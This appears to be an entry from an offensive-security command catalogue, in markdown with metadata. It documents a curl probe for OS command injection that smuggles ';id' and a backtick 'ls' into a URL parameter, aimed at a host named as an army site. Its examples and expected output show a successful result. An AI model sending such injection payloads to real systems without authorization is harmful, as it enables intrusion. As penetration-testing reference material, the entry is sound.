---
data: 'curl "http://target-army-site.com/vulnerable?param=;id" -v'
tags:
  - injection
  - testing
type: command
output: Response with potential shell output if vulnerable
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:41.889Z'
id: ef812fe2-0be6-45b7-b4b7-1969373db008
verified: false
validated: true
submitted: true
---
# curl-test-injection

## Command

```bash
curl "http://target-army-site.com/vulnerable?param=;id" -v
```

## Description

This command tests for code injection by appending a shell command to a URL parameter, sending it via curl to observe if the server executes it unsafely.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Target endpoint with injection payload | Yes |
| -v | Verbose output for headers and response | No |

## Examples

### Basic Usage

```bash
curl "http://example.com/vuln?input=;id" -v
```

### Advanced Usage

```bash
curl "http://example.com/vuln?input=`ls`" -v
```

## Expected Output

If vulnerable, the HTTP response body includes shell command output like 'uid=33(www-data) gid=33(www-data)'. Otherwise, standard error or no execution.

## Related

- [[Related Procedure]]
